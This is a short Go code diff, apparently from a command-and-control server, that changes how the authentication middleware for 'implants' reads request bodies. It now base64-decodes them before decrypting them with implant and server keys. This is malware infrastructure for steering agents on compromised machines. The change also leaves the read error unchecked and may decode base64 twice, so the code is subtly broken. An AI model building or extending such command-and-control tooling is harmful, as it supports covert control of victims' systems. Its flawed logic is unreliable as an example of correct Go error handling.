@@ -3,6 +3,7 @@ package c2
 import (
 	"bytes"
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"io"
 	"net/http"
@@ -53,18 +54,11 @@ func (h *Handler) implantAuthMiddleware(next http.Handler) http.Handler {
 
 		ctx := context.WithValue(r.Context(), implantContextKey, implant)
 
-		// If there's a request body, decrypt it
+		// If there's a request body, decode and decrypt it
 		if r.ContentLength > 0 {
-			body, err := io.ReadAll(r.Body)
-			r.Body.Close()
-			if err != nil {
-				h.logger.Error("failed to read request body", zap.Error(err))
-				http.Error(w, "Failed to read body", http.StatusBadRequest)
-				return
-			}
-
 			// Decrypt the body using implant's public key and server's private key
-			decrypted, err := crypto.DecryptB64Raw(implant.ImplantPK, implant.ServerSK, body)
+			decodedBody, err := io.ReadAll(base64.NewDecoder(base64.StdEncoding, r.Body))
+			decrypted, err := crypto.DecryptB64Raw(implant.ImplantPK, implant.ServerSK, decodedBody)
 			if err != nil {
 				h.logger.Error("failed to decrypt request body",
 					zap.String("implant_id", implantID),
